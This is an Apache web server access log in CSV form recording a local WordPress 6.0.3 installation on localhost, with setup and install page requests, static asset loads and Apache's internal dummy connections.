timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
19/Oct/2022:12:04:53,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:04:54,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:04:55,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/setup-config.php?step=1,"""http://localhost:8080/wp-admin/setup-config.php""",200,1453,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:41,172.17.0.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/install.min.css?ver=6.0.3""",304,248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:05:48,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:19:04,172.17.0.1,POST,/wp-admin/setup-config.php?step=2,"""http://localhost:8080/wp-admin/setup-config.php?step=1""",200,1028,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:04,172.17.0.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/install.min.css?ver=6.0.3""",304,248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:07,172.17.0.1,GET,/wp-admin/install.php?language=en_US,"""http://localhost:8080/wp-admin/setup-config.php?step=2""",200,2666,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/zxcvbn-async.min.js?ver=1.0,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,598,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2801,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/hooks.min.js?ver=c6d64f2cb8f5c6bb49caca37f8828ce3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2005,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,7439,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/dist/i18n.min.js?ver=ebee46757c6a411e38fd079a7ac71d94,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,4209,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-admin/js/password-strength-meter.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,963,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/wp-util.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,1047,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-admin/js/user-profile.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,2669,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/underscore.min.js?ver=1.13.3,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,7657,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:09,172.17.0.1,GET,/wp-includes/js/zxcvbn.min.js,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,400393,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:19:17,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
19/Oct/2022:12:20:02,172.17.0.1,POST,/wp-admin/install.php?step=2,"""http://localhost:8080/wp-admin/install.php?language=en_US""",200,1633,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/css/install.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,2125,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-admin/setup-config.php""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/js/language-chooser.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,615,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-admin/setup-config.php""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/,"""-""",302,265,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-admin/setup-config.php,"""-""",200,1386,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:45,172.17.0.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-admin/setup-config.php""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:19,172.17.0.1,GET,/,"""-""",200,3459,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:04:15,172.17.0.1,GET,/,"""-""",200,3460,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
